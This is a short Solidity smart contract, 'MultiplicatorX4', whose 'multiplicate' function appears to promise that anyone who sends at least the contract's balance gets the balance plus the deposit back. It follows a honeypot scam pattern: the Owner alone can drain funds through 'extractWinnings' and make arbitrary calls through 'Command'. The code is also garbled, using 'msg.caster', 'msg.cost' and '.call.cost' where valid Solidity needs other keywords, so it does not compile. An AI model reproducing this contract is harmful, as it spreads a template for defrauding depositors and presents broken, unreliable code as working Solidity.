pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public Owner = msg.caster;

    function() public payable{}

    function extractWinnings()
    payable
    public
    {
        require(msg.caster == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes details)
    payable
    public
    {
        require(msg.caster == Owner);
        adr.call.cost(msg.cost)(details);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.cost>=this.balance)
        {
            adr.transfer(this.balance+msg.cost);
        }
    }
}